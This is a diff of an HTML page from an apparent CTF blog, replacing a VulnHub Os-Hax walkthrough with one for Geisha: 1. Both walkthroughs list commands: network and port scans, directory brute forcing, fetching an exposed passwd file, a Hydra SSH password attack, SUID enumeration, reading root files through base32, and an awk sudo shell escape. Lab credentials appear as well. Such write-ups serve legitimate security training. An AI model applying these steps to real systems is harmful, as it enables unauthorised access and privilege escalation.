@@ -9,13 +9,13 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>Walkthrough Os-Hax vulnhub CTF</title>
+    <title>Walkthrough Geisha: 1</title>
 	
 	<!-- Favicon -->
 	<link rel="shortcut icon" href="img/favicon.ico" type="image/icon"> 
 	<link rel="icon" href="img/favicon.ico" type="image/icon">
-	
-    <!-- Bootstrap Core CSS -->
+    
+	<!-- Bootstrap Core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
 
     <!-- Theme CSS -->
@@ -73,14 +73,14 @@
 
     <!-- Page Header -->
     <!-- Set your background image for this header on the line below. -->
-    <header class="intro-header" style="background-image: url('img/post1/hox.jpg')">
+    <header class="intro-header" style="background-image: url('img/post10/geisha.jpg')">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                     <div class="post-heading">
-                        <h1>Os-Hax</h1>
-                        <h2 class="subheading">Difficulty: Easy</h2>
-                        <span class="meta">Posted by <a href="about.html">Admin</a> on December 2, 2019</span>
+                        <h1>Geisha: 1</h1>
+                        <h2 class="subheading">Difficulty: Beginner to Intermediate</h2>
+						<span class="meta">Posted by <a href="about.html">Admin</a> on May 21, 2020</span>
                     </div>
                 </div>
             </div>
@@ -92,84 +92,91 @@
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    <p><a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">CTF link</a></p>
-					<h2 class="section-heading">Boot2User</h2>
-
-                    <p>At this stage, we will scan the network and find the ip address of the machine.</p>
+                    <p><a href="https://www.vulnhub.com/entry/geisha-1,481/">CTF link</a></p>
 					
-					<a href="img/post1/image1.png">
-                        <img class="img-responsive" src="img/post1/image1.png" alt="">
+					<p>Good afternoon, today we will be walkthrough the second machine from <a href="https://www.vulnhub.com/author/suncsr-team,696/">SunCSR Team	</a> called Geisha.</p>
+					
+					<li>Goal: get acces to the root flag.txt</li>
+					
+					<h2 class="section-heading">Foothold</h2>
+					
+					<p>Let's scan the local network in search of our goal.</p>
+					
+					<a href="img/post10/image1.png">
+                        <img class="img-responsive" src="img/post10/image1.png" alt="">
                     </a>
 					
 					<pre><code>arp-scan -l</code></pre>
-
-                    <p>As we see this is 192.168.2.102. Next we will see open ports.</p>
 					
-					<a href="img/post1/image2.png">
-                        <img class="img-responsive" src="img/post1/image2.png" alt="">
-                    </a>
-					<pre><code>nmap 192.168.2.102</code></pre>
-					
-					<p>Open ssh and apache, so let's check the web page.</p>
-					
-					<a href="img/post1/image3.png">
-                        <img class="img-responsive" src="img/post1/image3.png" alt="">
+					<p>Now we need to scan the open ports of our target</p>
+                  
+					<a href="img/post10/image2.png">
+                        <img class="img-responsive" src="img/post10/image2.png" alt="">
                     </a>
 					
-					<p>Now let's find something interesting.</p>
+					<pre><code>nmap -A -T4 -p20-9000 192.168.2.102 > nmap_scan.txt && cat nmap_scan.txt</code></pre>
+                   
+				    <p>When scanning ports, I saw a lot of web servers. These were nginx, LiteSpeed, Apache2. After 5 minutes of enumeration, I found what I need namely Nginx on 7125 port.</p>
 					
-					<pre><code>nikto -h 192.168.2.102 -p 80</code></pre>
-					
-					<a href="img/post1/image4.png">
-                        <img class="img-responsive" src="img/post1/image4.png" alt="">
+					<a href="img/post10/image3.png">
+                        <img class="img-responsive" src="img/post10/image3.png" alt="">
                     </a>
 					
-					<p>In directory /img/ nikto found an interesting file called flaghost.png. After scanning the image through exiftool, I get a new directory names, in which I find the file "flag2.txt"</p>
+					<h2 class="section-heading">Geisha</h2>
 					
-					<pre><code>192.168.2.102/passw@45/</code></pre>
+					<p>When listing files in the web directory, I found the passwd file and the shadow file, but the shadow file gives us the code 403 (forbidden) so we can only read the passwd file</p>
 					
-					<a href="img/post1/image5.png">
-                        <img class="img-responsive" src="img/post1/image5.png" alt="">
+					<a href="img/post10/image4.png">
+                        <img class="img-responsive" src="img/post10/image4.png" alt="">
                     </a>
 					
-					<a href="img/post1/image6.png">
-                        <img class="img-responsive" src="img/post1/image6.png" alt="">
+					<pre><code>gobuster dir -u http://192.168.2.102:7125/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt</code></pre>
+					
+					<p>After I downloaded the file using curl, I look at its contents with cat and find out the username of the user for brute force</p>
+					
+					<a href="img/post10/image5.png">
+                        <img class="img-responsive" src="img/post10/image5.png" alt="">
                     </a>
 					
-					<p>After decrypting a mysterious file that is encrypted with the Brainfuck cipher, I received data for ssh authorization.</p>
+					<pre><code>curl http://192.168.2.102:7125/passwd -o passwd && cat passwd | grep home</code></pre>
 					
-					<pre><code>web:Hacker@4514</code></pre>
+					<pre><code>geisha</code></pre>
 					
-					<a href="img/post1/image7.png">
-                        <img class="img-responsive" src="img/post1/image7.png" alt="">
+					<p>With Hydra, I attack passwords using the username from the passwd file and get authorization data</p>
+					
+					<a href="img/post10/image6.png">
+                        <img class="img-responsive" src="img/post10/image6.png" alt="">
                     </a>
 					
-					<p>In home directory I found a flag.</p>
+					<pre><code>hydra -l geisha -P ~/wordlists/rockyou.txt ssh://192.168.2.102</code></pre>
 					
-					<a href="img/post1/image8.png">
-                        <img class="img-responsive" src="img/post1/image8.png" alt="">
+					<pre><code>geisha:letmein</code></pre>
+					
+					<p>Now i connect via ssh and got user.</p>
+					
+					<a href="img/post10/image7.png">
+                        <img class="img-responsive" src="img/post10/image7.png" alt="">
                     </a>
 					
-                    <h2 class="section-heading">Boot2R00t</h2>
+					<h2 class="section-heading">Path to the root flag</h2>
 					
-					<p>Using following command i see that I can run awk using root privileges.</p>
-				
-                    <a href="img/post1/image9.png">
-                        <img class="img-responsive" src="img/post1/image9.png" alt="">
+					<p>On the system, I find a base32 SUID file that allows you to read files with root access</p>
+					
+					<a href="img/post10/image8.png">
+                        <img class="img-responsive" src="img/post10/image8.png" alt="">
                     </a>
-					<pre><code>sudo -l</code></pre>
 					
-					<p>Now i get root using awk, thank awk xD</p>
+					<pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
 					
-					<a href="img/post1/image10.png">
-                        <img class="img-responsive" src="img/post1/image10.png" alt="">
+					<p>With base32, I get the contents of the /root/flag.txt file encoded in base32 encoding, in order to decrypt it I use the decode option.</p>
+					
+					<a href="img/post10/image9.png">
+                        <img class="img-responsive" src="img/post10/image9.png" alt="">
                     </a>
-                    
-					<pre><code>sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'</code></pre>
 					
-					<p>The all. Thanks <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/">Rahul Gehlaut</a> for a good CTF.</p>
-
-                </div>
+					<pre><code>Flag{Sun_CTF_220_5_G31sha}</code></pre>
+					
+			   </div>
             </div>
         </div>
     </article>
